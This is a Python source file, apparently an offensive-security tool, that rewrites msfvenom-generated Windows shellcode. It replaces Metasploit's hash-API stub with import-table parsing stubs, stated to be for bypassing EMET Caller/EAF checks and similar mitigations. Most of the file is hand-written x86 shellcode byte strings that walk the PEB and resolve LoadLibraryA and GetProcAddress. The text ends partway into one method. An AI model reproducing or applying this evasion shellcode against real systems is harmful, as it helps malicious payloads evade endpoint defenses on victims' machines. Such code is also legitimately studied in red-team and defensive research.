#!/usr/bin/env python3
'''
Copyright (c) 2017-2047, Joshua Pitts
All rights reserved.
Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.
    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.
    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.
'''
from __future__ import print_function
from collections import OrderedDict
from capstone import *
from capstone.x86 import *
import struct
import pefile
import io
import sys
import re
import random
import string
import argparse
import binascii
import signal
import json
import os
import ntpath


'''
Notes:
- going to need to x64 Disassembling
- need to write the stubs (do this first, the rest is easy)
- Flow:
    * look at inputted shellcode (is x86 or x64) based on Stephen Fewers hash api
    * do what x86 code does, but for x64


'''


def signal_handler(signal, frame):
        print('\nProgram Exit')
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description="""This code imports metasploit sourced x86 windows shellcode that employs 
Stephen Fewers Hash API stub and replaces it to bypass EMET Caller/EAF checks
and other bolt on mitigations. Accepts msfvenom output from stdin or from disk. 
Doesn't do logic checks on provided payload to ensure it is x86 (32bit) or for windows 
OS (up to you to be correct)""",
        usage='use "%(prog)s --help" for more information',
        formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('infile', nargs='?', type=argparse.FileType('r'),
                     default=sys.stdin)
parser.add_argument("-b", "--targetbinary", default="", dest="targetbinary", 
                    action="store", 
                    help="Binary that shellcode will be customized to (Optional)"
                    )
parser.add_argument("-t", "--OSTarget", default="Win7", dest="OS",
                    action="store",
                    help="OS target for looking for target DLL Import Tables: winXP, win7, win8, winVista, win10")
parser.add_argument("-s", '--shellcode', default="", dest="code",
                    action="store",
                    help="x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin")
parser.add_argument("-d", '--DLLName', default="", dest="dll", action="store",
                    help="If you know the DLL in the IAT you are targeting enter this, no need for OS flag.")
parser.add_argument("-l", '--Import', default='kernel32.dll', dest='importname', action='store',
                    help="""For use with -d and ExternGPA (-p), specify either 'kernel32.dll' or 
'api-ms-win-core-libraryloader' -- you need to know with import you are targeting.
To know, run without -d for a list of candidates. Default is kernel32.dll but not always right!
                    """)
parser.add_argument('-m', '--mangle', default=False, dest="mangle",
                    action="store_true", 
                    help="Mangle metasploit hash apis from their original values (you want to do this)")
parser.add_argument('outfile', nargs='?', type=argparse.FileType('w'),
                    default=sys.stdout,
                    )                          
parser.add_argument('-o', '--output', dest="OUTPUT", action="store", default='stdout', 
                    help="How you would like your output: [c], [p]ython, c[s]harp Default: stdout."
                    )
parser.add_argument("-p", "--parser_stub", dest="parser_stub", action="store", default='GPA', 
                    help="""By default this assumes that GetProcAddress (GPA) is in the targetbinary's
Import Address Table (IAT) if no targetbinary or DLL name is provided.
Seven options:
    GPA  - GPA is in targetbinary IAT (default)
    LLAGPA - LoadlibraryA(LLA)/GPA is in the targetbinary IAT (smallest shellcode option)
    ExternGPA -- need DLLName or targetbinary to use
    ExternLLAGPA -- need DLLName or targetbinary to use
    ExternGPAFC -- -d kernel32.dll -l kernelbase.dll  # only works on win8 - win10
    OffsetGPA -- -b target.EXE # static offset to that version of software (target EXE)
    ExternOffsetGPA -- -b target.DLL -d import_dll # static offset to that version of software (target DLL)
                    """
                    )
parser.add_argument('-n', '--donotfail', dest='dontfail', action='store_true', default=False,
                    help='Default: Fail if Stephen Fewers Hash API stub is not there, use -n to bypass')
parser.add_argument('-M', '--mode', default='', dest='mode', action='store',
                    help='ASM mode 32 or 64, usually automatic')

args = parser.parse_args()



if args.infile.buffer.seekable() is False:
    # READ from stdin because content is there
    args.code = args.infile.buffer.read()

if not args.code:
    print('[!] -s is required either from cmd line flag or stdin <cat code.bin> | {0}'.format(sys.argv[0]))
    parser.print_help()
    sys.exit(-1)     


class stubs_32:

    def __init__(self, impts):
        self.impts = impts
        self.imp_offset = 0

    def check_imports(self):
        ####################################
        #### Parse imports via pefile ######

        #make this option only if a IAT based shellcode is selected
        pe = pefile.PE(self.impts.targetbinary, fast_load=True)
        sys.stderr.write("[*] Parsing data directories...\n")
        pe.parse_data_directories()
        
        try: 
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                for imp in entry.imports:
                    if imp.name is None:
                        continue
                    if imp.name.lower() == b'GetProcaddress'.lower():
                        self.imp_offset = imp.address - pe.OPTIONAL_HEADER.ImageBase
                        sys.stderr.write("[*] GPA offset: {0}\n".format(hex(self.imp_offset))) 
        
                    # Easter egg???
                    #if imp.name.lower() == b'GetProcaddressforcaller'.lower():
                    #    self.imp_offset =  imp.address - pe.OPTIONAL_HEADER.ImageBase
                    #    sys.stderr.write("[*] GPAFC offset: {0}\n".format(hex(self.imp_offset))) 
        
        except Exception as e:
            sys.stderr.write("Exception: {0}\n".format(e))

    def lla_gpa_parser_stub(self):
        self.parser_stub = 'LLAGPA'
        self.importname = 'main_module'

        shellcode =  bytes( 
               "\xfc"
               "\x60"                               # pushad
               "\x8B\xEC"       
               "\x31\xd2"                           # xor edx, edx                          ;prep edx for use
               "\x64\x8b\x52\x30"                   # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
               "\x8b\x52\x08"                       # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
               "\x8b\xda"                           # mov ebx, edx                          ;Set ebx to imagebase
               "\x03\x52\x3c"                       # add edx, dword ptr [edx + 0x3c]       ;"PE"
               "\x8b\xba\x80\x00\x00\x00"           # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
               "\x03\xfb"                           # add edi, ebx                          ;Import table in memory offset
        
               #findImport:     
               "\x8b\x57\x0c"                       # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
               "\x03\xd3"                           # add edx, ebx                          ;Offset in memory
               "\x81\x3a\x4b\x45\x52\x4e"           # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
               "\x75\x09"                           # JE short 
               "\x81\x7A\x04\x45\x4C\x33\x32"       # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
               "\x74\x05"                           # je 0x102f                             ;jmp saveBase
               "\x83\xc7\x14"                       # add edi, 0x14                         ;inc to next import
               "\xeb\xe5"                           # jmp 0x101d                            ;Jmp findImport
        
               #saveBase:       
               "\x57"                               # push edi                              ;save addr of import base
               "\xeb\x3e"                           # jmp 0x106e                            ;jmp loadAPIs

               #setBounds:
               #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
               "\x8b\x57\x10"                       # mov edx, dword ptr [edi + 0x10]       ;Point to API name
               "\x03\xd3"                           # add edx, ebx                          ;Adjust to in memory offset
               "\x8b\x37"                           # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
               "\x03\xf3"                           # add esi, ebx                          ;Adjust to in memory offset
               "\x8b\xca"                           # mov ecx, edx                          ;Mov in memory offset to ecx
               "\x81\xc1\x00\x00\xff\x00"           # add ecx, 0x40000                      ;Set an upper bounds for reading
               "\x33\xed"                           # xor ebp, ebp                          ;Zero ebp for thunk offset
        
               #findAPI:        
               "\x8b\x06"                           # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
               "\x03\xc3"                           # add eax, ebx                          ;Find in memory offset
               "\x83\xc0\x02"                       # add eax, 2                            ;Adjust to ASCII name start
               "\x3b\xc8"                           # cmp ecx, eax                          ;Check if over bounds
               "\x72\x18"                           # jb 0x1066                             ;If not over, don't jump to increment
               "\x3b\xc2"                           # cmp eax, edx                          ;Check if under Named import
               "\x72\x14"                           # jb 0x1066                             ;If not over, don't jump to increment
               "\x3e\x8b\x7c\x24\x04"               # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
               "\x39\x38"                           # cmp dword ptr [eax], edi              ;Check first 4 chars
               "\x75\x0b"                           # jne 0x1066                            ;If not a match, jump to increment
               "\x3e\x8b\x7c\x24\x08"               # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
               "\x39\x78\x08"                       # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
               "\x75\x01"                           # jne 0x1066                            ;If not a match, jump to increment
               "\xc3"                               # ret                                   ;If a match, ret
        
               #Increment:      
               "\x83\xc5\x04"                       # add ebp, 4                            ;inc offset
               "\x83\xc6\x04"                       # add esi, 4                            ;inc to next name
               "\xeb\xd5"                           # jmp 0x1043                            ;jmp findAPI
        
               #loadAPIs        
               "\x68\x61\x72\x79\x41"               # push 0x41797261                       ;aryA (notice the 4 char jump between beginning)
               "\x68\x4c\x6f\x61\x64"               # push 0x64616f4c                       ;Load
               "\xe8\xb3\xff\xff\xff"               # call 0x1032                           ;call setBounds
               "\x03\xd5"                           # add edx, ebp                          ;In memory offset of API thunk
               "\x83\xc4\x08"                       # add ESP, 8                            ;Move stack to import base addr
               "\x5f"                               # pop edi                               ;restore import base addr for parsing
               "\x52"                               # push edx                              ;save LoadLibraryA thunk address on stack
               "\x68\x64\x64\x72\x65"               # push 0x65726464                       ;ddre
               "\x68\x47\x65\x74\x50"               # push 0x50746547                       ;Getp
               "\xe8\x9d\xff\xff\xff"               # call 0x1032                           ;call setBounds
               "\x03\xd5"                           # add edx, ebp                          ;
               "\x5d"                               # pop ebp                               ;
               "\x5d"                               # pop ebp                               ;
               "\x5b"                               # pop ebx                               ;Pop LoadlibraryA thunk addr into ebx
               "\x8b\xea"                           # mov ebp, edx                          ;Move GetProcaddress thunk addr into ebx
               , 'iso-8859-1')
               # LLA in EBX
               # GPA EBP
        return shellcode 
 
    def gpa_parser_stub(self): 
        self.parser_stub = 'GPA'
        self.importname = 'main_module'

        shellcode = bytes( "\xfc"
               "\x60"                               # pushad
               "\x31\xd2"                           # xor edx, edx                          ;prep edx for use
               "\x64\x8b\x52\x30"                   # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
               "\x8b\x52\x08"                       # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
               "\x8b\xda"                           # mov ebx, edx                          ;Set ebx to imagebase
               #"\x8b\xc3"                          # mov eax, ebx                          ;Set eax to imagebase
               "\x03\x52\x3c"                       # add edx, dword ptr [edx + 0x3c]       ;"PE"
               "\x8b\xba\x80\x00\x00\x00"           # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
               "\x03\xfb"                           # add edi, ebx                          ;Import table in memory offset
        
               #findImport:     
               "\x8b\x57\x0c"                       # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
               "\x03\xd3"                           # add edx, ebx                          ;Offset in memory
               "\x81\x3a\x4b\x45\x52\x4e"           # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
               "\x75\x09"                           # JE short 
               "\x81\x7A\x04\x45\x4C\x33\x32"       # CMP DWORD PTR DS:[EDX+4],32334C45 ; el32
               "\x74\x05"                           # je 0x102f                             ;jmp saveBase
               "\x83\xc7\x14"                       # add edi, 0x14                         ;inc to next import
               "\xeb\xe5"                           # jmp 0x101d                            ;Jmp findImport
                    
               #saveBase:       
               "\x57"                               # push edi                              ;save addr of import base
               "\xeb\x3e"                           # jmp 0x106e                            ;jmp loadAPIs

               #setBounds:
               #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
               "\x8b\x57\x10"                       # mov edx, dword ptr [edi + 0x10]       ;Point to API name
               "\x03\xd3"                           # add edx, ebx                          ;Adjust to in memory offset
               "\x8b\x37"                           # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
               "\x03\xf3"                           # add esi, ebx                          ;Adjust to in memory offset
               "\x8b\xca"                           # mov ecx, edx                          ;Mov in memory offset to ecx
               "\x81\xc1\x00\x00\xff\x00"           # add ecx, 0x40000                      ;Set an upper bounds for reading
               "\x33\xed"                           # xor ebp, ebp                          ;Zero ebp for thunk offset
        
               #findAPI:        
               "\x8b\x06"                           # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
               "\x03\xc3"                           # add eax, ebx                          ;Find in memory offset
               "\x83\xc0\x02"                       # add eax, 2                            ;Adjust to ASCII name start
               "\x3b\xc8"                           # cmp ecx, eax                          ;Check if over bounds
               "\x72\x18"                           # jb 0x1066                             ;If not over, don't jump to increment
               "\x3b\xc2"                           # cmp eax, edx                          ;Check if under Named import
               "\x72\x14"                           # jb 0x1066                             ;If not over, don't jump to increment
               "\x3e\x8b\x7c\x24\x04"               # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
               "\x39\x38"                           # cmp dword ptr [eax], edi              ;Check first 4 chars
               "\x75\x0b"                           # jne 0x1066                            ;If not a match, jump to increment
               "\x3e\x8b\x7c\x24\x08"               # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
               "\x39\x78\x08"                       # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
               "\x75\x01"                           # jne 0x1066                            ;If not a match, jump to increment
               "\xc3"                               # ret                                   ;If a match, ret
        
               #Increment:      
               "\x83\xc5\x04"                       # add ebp, 4                            ;inc offset
               "\x83\xc6\x04"                       # add esi, 4                            ;inc to next name
               "\xeb\xd5"                           # jmp 0x1043                            ;jmp findAPI
        
               #loadAPIs        
               "\x68\x64\x64\x72\x65"               # push 0x65726464                       ;ddre
               "\x68\x47\x65\x74\x50"               # push 0x50746547                       ;Getp
               "\xe8\xb3\xff\xff\xff"               # call 0x1032                           ;call setBounds
               "\x03\xd5"                           # add edx, ebp                          ;
               "\x5d"                               # pop ebp                               ;
               "\x5d"                               # pop ebp                               ;
               "\x8b\xca"                           # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
               
               # GPA in ECX
               "\x89\xCD" # mov ebp, ecx            # mov GPA to ebp
               "\x31\xd2"                           # xor    edx,edx
               "\x64\x8b\x52\x30"                   # mov    edx,DWORD PTR fs:[edx+0x30]
               "\x8b\x52\x0c"                       # mov    edx,DWORD PTR [edx+0xc]
               "\x8b\x52\x14"                       # mov    edx,DWORD PTR [edx+0x14]
               "\x8b\x72\x28"                       # mov    esi,DWORD PTR [edx+0x28]
               "\x6a\x18"                           # push   0x18
               "\x59"                               # pop    ecx
               "\x31\xff"                           # xor    edi,edi
               "\x31\xc0"                           # xor    eax,eax
               "\xac"                               # lods   al,BYTE PTR ds:[esi]
               "\x3c\x61"                           # cmp    al,0x61
               "\x7c\x02"                           # jl     0x20
               "\x2c\x20"                           # sub    al,0x20
               "\xc1\xcf\x0d"                       # ror    edi,0xd
               "\x01\xc7"                           # add    edi,eax
               "\xe2\xf0"                           # loop   0x17
               "\x81\xff\x5b\xbc\x4a\x6a"           # cmp    edi,0x6a4abc5b
               "\x8b\x5a\x10"                       # mov    ebx,DWORD PTR [edx+0x10]
               "\x8b\x12"                           # mov    edx,DWORD PTR [edx]
               "\x75\xdb"                           # jne    0xf
               # kernel32.dll in ebx
               "\x6A\x00"                           # push 0
               "\x68\x61\x72\x79\x41"               # push LoadLibraryA\x00
               "\x68\x4c\x69\x62\x72"           
               "\x68\x4c\x6f\x61\x64"           
               "\x54"                               # push esp
               "\x53"                               # push ebx (kernel32.dll handle)
               "\x89\xE9"                           # mov ecx,ebp getprocaddr
               "\xFF\x11"                           # call dword ptr [ecx]  # call dword ptr [ecx] 
               "\x50"                               # push eax ; LLA in EAX
               "\x89\xe3"                           # mov ebx, esp ; mov ptr to LLA in ebx
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack
               "\x58"                               # pop eax, to align stack

               
               , 'iso-8859-1')
        return shellcode 
        # LOADLIBA in EBX
        # GETPROCADDR in EBP
    
    def loaded_lla_gpa_parser_stub(self):
        self.parser_stub = 'ExternLLAGPA'
        
        shellcode1 = bytes(  # Locate ADVAPI32 via PEB Ldr.InMemoryOrderModuleList ref:http://blog.harmonysecurity.com/2009_06_01_archive.html
              "\xfc"                                # cld
              "\x60"                                # pushad  
              "\x31\xd2"                            # xor edx,edx
              "\x64\x8b\x52\x30"                    # mov edx,[fs:edx+0x30]
              "\x8b\x52\x0c"                        # mov edx,[edx+0xc]
              "\x8b\x52\x14"                        # mov edx,[edx+0x14]
              # next_mod    
              "\x8b\x72\x28"                        # mov esi,[edx+0x28]
              "\x6a\x18"                            # push byte +0x18
              "\x59"                                # pop ecx
              "\x31\xff"                            # xor edi,edi
              # loop_modname    
              "\x31\xc0"                            # xor eax,eax
              "\xac"                                # lodsb
              "\x3c\x61"                            # cmp al,0x61
              "\x7c\x02"                            # jl 0x20
              "\x2c\x20"                            # sub al,0x20
              # not_lowercase       
              "\xc1\xcf\x0d"                        # ror edi,byte 0xd
              "\x01\xc7"                            # add edi,eax
              "\xe2\xf0"                            # loop 0x17
              
              , 'iso-8859-1')

        shellcode2 = b"\x81\xff"
        shellcode2 += struct.pack("<I", self.impts.DLL_INFO['hash'])
    
        shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]
             "\x8b\x12"                             # mov edx,[edx]
             "\x75\xdb"                             # jnz 0xf
             # iatparser        
             "\x89\xda"                             # mov edx,ebx
             "\x03\x52\x3c"                         # add edx,[edx+0x3c]
             "\x8b\xba\x80\x00\x00\x00"             # mov edi,[edx+0x80]
             "\x01\xdf"                             # add edi,ebx
             # findImport   
             "\x8b\x57\x0c"                         # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
             "\x03\xd3"                             # add edx, ebx                          ;Offset in memory
             , 'iso-8859-1')
        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
            shellcode3 += (
           b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
           b"\x75\x09"                               # JE short
           b"\x81\x7A\x04\x45\x4C\x33\x32"           # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
           b"\x74\x05"                               # je 0x102f                             ; jmp saveBase
           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
           b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
           )
        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
            shellcode3 += (
           b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
           b"\x75\x09"
           b"\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
           b"\x74\x05"
           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
           b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
          )
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
            sys.exit(-1)
        
        shellcode3 += bytes(
             # saveBase 
             "\x57"                                 # push edi
             "\xeb\x39"                             # jmp short 0x9f
             # setbounds        
             "\x8b\x57\x10"                         # mov edx,[edi+0x10]
             "\x01\xda"                             # add edx,ebx
             "\x8b\x37"                             # mov esi,[edi]
             "\x01\xde"                             # add esi,ebx
             "\x89\xd1"                             # mov ecx,edx    
             "\x81\xc1\x00\x00\xff\x00"             # add ecx,0xff0000
             "\x31\xed"                             # xor ebp,ebp
             # findApi      
             "\x8b\x06"                             # mov eax,[esi]
             "\x01\xd8"                             # add eax,ebx
             "\x83\xc0\x02"                         # add eax,byte +0x2
             "\x39\xc1"                             # cmp ecx,eax
             "\x72\x13"                             # jc 0x97
             "\x8b\x7c\x24\x04"                     # mov edi,[esp+0x4]
             "\x39\x38"                             # cmp [eax],edi
             "\x75\x0b"                             # jnz 0x97
             "\x3e\x8b\x7c\x24\x08"                 # mov edi,[ds:esp+0x8]
             "\x39\x78\x08"                         # cmp [eax+0x8],edi
             "\x75\x01"                             # jnz 0x97
             "\xc3"                                 # ret
             # Increment        
             "\x83\xc5\x04"                         # add ebp,byte +0x4
             "\x83\xc6\x04"                         # add esi,byte +0x4
             "\xeb\xda"                             # jmp short 0x77
             , 'iso-8859-1')
             # loadApis     
        if self.impts.DLL_INFO['importname'].lower() == 'kernel32.dll':
            shellcode3 += b"\x68\x61\x72\x79\x41"                 # push dword 0x41797261 ; raryA
        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
            shellcode3 += b"\x68\x61\x72\x79\x45"
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
            sys.exit(-1)
 
        shellcode3 += bytes(
             "\x68\x4c\x6f\x61\x64"                 # push dword 0x64616f4c
             "\xe8\xb8\xff\xff\xff"                 # call dword 0x62
             "\x01\xea"                             # add edx,ebp
             "\x83\xc4\x08"                         # add esp,byte +0x8
             "\x5f"                                 # pop edi
             "\x52"                                 # push edx
             "\x68\x64\x64\x72\x65"                 # push dword 0x65726464
             "\x68\x47\x65\x74\x50"                 # push dword 0x50746547
             "\xe8\xA2\xff\xff\xff"                 # call dword 0x62
             "\x01\xea"                             # add edx,ebp
             "\x5d"                                 # pop ebp
             "\x5d"                                 # pop ebp
             "\x5b"                                 # pop ebx
             "\x8b\xea"                             # mov ebp,edx    
            , 'iso-8859-1')
            # LOADLIBA in EBX
            # GETPROCADDR in EBP
    
        return shellcode1 + shellcode2 + shellcode3
        
    def loaded_gpa_iat_parser_stub(self):
        self.parser_stub = 'ExternGPA'
        
        shellcode1 = bytes("\xfc"                   # cld
            "\x60"                                  # pushad
            "\x31\xd2"                              # xor edx,edx
            "\x64\x8b\x52\x30"                      # mov edx,[fs:edx+0x30]     ; PEB
            "\x8b\x52\x0c"                          # mov edx,[edx+0xc]         ; PEB_LDR_DATA 
            "\x8b\x52\x14"                          # mov edx,[edx+0x14]        ; ptr Flink Linked List in InMemoryOrderModuleList
            # next_mod
            "\x8b\x72\x28"                          # mov esi,[edx+0x28]        ; Points to UTF-16 module name in LDR_MODULE
            "\x6a\x18"                              # push byte +0x18           ; Set loop counter length
            "\x59"                                  # pop ecx                   ; Set loop counter length
            "\x31\xff"                              # xor edi,edi               ; clear edi to 0
            # loop_modnam
            "\x31\xc0"                              # xor eax,eax               ; clear eax to 0
            "\xac"                                  # lodsb                     ; load last to esi
            "\x3c\x61"                              # cmp al,0x61               ; check for capitalization
            "\x7c\x02"                              # jl 0x20                   ; if < 0x61 jump
            "\x2c\x20"                              # sub al,0x20               ; capitalize the letter
            # not_lowercase
            "\xc1\xcf\x0d"                          # ror edi,byte 0xd          ; rotate edi right 0xd bits
            "\x01\xc7"                              # add edi,eax               ; add sum to edi
            "\xe2\xf0"                              # loop 0x17                 ; continue until loop ends
            , "iso-8859-1")
        
        shellcode2 = b"\x81\xff"                    # cmp edi, DLL_HASH
        shellcode2 += struct.pack("<I", self.impts.DLL_INFO['hash'])                          
    
    
        shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
            "\x8b\x12"                              # mov edx,[edx]             ; set edx base for next module interation
            "\x75\xdb"                              # jnz 0xf
            # iatparser         
            "\x89\xda"                              # mov edx,ebx               ; set as edx as image base
            "\x03\x52\x3c"                          # add edx,[edx+0x3c]        ; PE
            "\x8b\xba\x80\x00\x00\x00"              # mov edi,[edx+0x80]        ; Import Table RVA
            "\x01\xdf"                              # add edi,ebx
            # findImport
            "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
            "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
            , 'iso-8859-1')                            
        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
            shellcode3 += (
           b"\x81\x3a\x4b\x45\x52\x4e"               # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
           b"\x75\x09"                               # JE short 
           b"\x81\x7A\x04\x45\x4C\x33\x32"           # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
           b"\x74\x05"                               # je 0x102f                             ; jmp saveBase
           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
           b"\xeb\xe5"                               # jmp 0x101d                            ; Jmp findImport
           )
        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
            shellcode3 += (
           b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
           b"\x75\x09"
           b"\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
           b"\x74\x05"
           b"\x83\xc7\x14"                           # add edi, 0x14                         ; inc to next import
           b"\xeb\xe4"                               # jmp 0x101d                            ; Jmp findImport
          )
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
            sys.exit(-1)

        shellcode3 += bytes(
            # saveBase
            "\x57"                                  # push edi
            "\xeb\x39"                              # jmp short 0x9f
            # setbounds         
            "\x8b\x57\x10"                          # mov edx,[edi+0x10]
            "\x01\xda"                              # add edx,ebx
            "\x8b\x37"                              # mov esi,[edi]
            "\x01\xde"                              # add esi,ebx
            "\x89\xd1"                              # mov ecx,edx   
            "\x81\xc1\x00\x00\xff\x00"              #  add ecx,0xff0000     
            "\x31\xed"                              #  xor ebp,ebp
            # findApi           
            "\x8b\x06"                              #  mov eax,[esi]
            "\x01\xd8"                              #  add eax,ebx
            "\x83\xc0\x02"                          #  add eax,byte +0x2
            "\x39\xc1"                              #  cmp ecx,eax
            "\x72\x13"                              #  jc 0x97
            "\x8b\x7c\x24\x04"                      #  mov edi,[esp+0x4]
            "\x39\x38"                              #  cmp [eax],edi
            "\x75\x0b"                              #  jnz 0x97
            "\x3e\x8b\x7c\x24\x08"                  #  mov edi,[ds:esp+0x8]
            "\x39\x78\x08"                          #  cmp [eax+0x8],edi
            "\x75\x01"                              #  jnz 0x97
            "\xc3"                                  #  ret
            # Increment         
            "\x83\xc5\x04"                          #  add ebp,byte +0x4
            "\x83\xc6\x04"                          #  add esi,byte +0x4
            "\xeb\xda"                              #  jmp short 0x77
            # loadApis
            "\x68\x64\x64\x72\x65"                  # push 0x65726464                       ;ddre
            "\x68\x47\x65\x74\x50"                  # push 0x50746547                       ;Getp
            "\xe8\xb8\xff\xff\xff"                  # call 0x1032        å                   ;call setBounds
            "\x03\xd5"                              # add edx, ebp                          ;
            "\x5d"                                  # pop ebp                               ;
            "\x5d"                                  # pop ebp                               ;
            "\x8b\xca"                              # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
            , 'iso-8859-1')
                    #GPA in ECX
        shellcode3 += b"\x89\xCD"                   # mov ebp, ecx GPA in EBP
        shellcode3 += bytes("\x31\xd2"              # xor    edx,edx
            "\x64\x8b\x52\x30"                      # mov    edx,DWORD PTR fs:[edx+0x30]
            "\x8b\x52\x0c"                          # mov    edx,DWORD PTR [edx+0xc]
            "\x8b\x52\x14"                          # mov    edx,DWORD PTR [edx+0x14]
            "\x8b\x72\x28"                          # mov    esi,DWORD PTR [edx+0x28]
            "\x6a\x18"                              # push   0x18
            "\x59"                                  # pop    ecx
            "\x31\xff"                              # xor    edi,edi
            "\x31\xc0"                              # xor    eax,eax
            "\xac"                                  # lods   al,BYTE PTR ds:[esi]
            "\x3c\x61"                              # cmp    al,0x61
            "\x7c\x02"                              # jl     0x20
            "\x2c\x20"                              # sub    al,0x20
            "\xc1\xcf\x0d"                          # ror    edi,0xd
            "\x01\xc7"                              # add    edi,eax
            "\xe2\xf0"                              # loop   0x17
            "\x81\xff\x5b\xbc\x4a\x6a"              # cmp    edi,0x6a4abc5b
            "\x8b\x5a\x10"                          # mov    ebx,DWORD PTR [edx+0x10]
            "\x8b\x12"                              # mov    edx,DWORD PTR [edx]
            "\x75\xdb"                              # jne    0xf
            , 'iso-8859-1')
    
        # kernel32.dll in ebx
        shellcode3 += bytes("\x6A\x00"              # push 0
            "\x68\x61\x72\x79\x41"                  # push LoadLibraryA\x00
            "\x68\x4c\x69\x62\x72"              
            "\x68\x4c\x6f\x61\x64"              
            "\x54"                                  # push esp
            "\x53"                                  # push ebx (kernel32.dll handle)
            "\x89\xE9"                              # mov ecx,ebp getprocaddr
            "\xFF\x11"                              # call dword ptr [ecx]  # call dword ptr [ecx] 
            "\x50"                                  # push eax ; LLA in EAX
            "\x89\xe3"                              # mov ebx, esp ; mov ptr to LLA in ebx
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack
            "\x58"                                  # pop eax, to align stack

                       , 'iso-8859-1')
        # LOADLIBA in EBX
        # GETPROCADDR in EBP
    
        return shellcode1 + shellcode2 + shellcode3

    def loaded_gpafc_iat_parser_stub(self):
        self.parser_stub = 'ExternGPAFC'
        
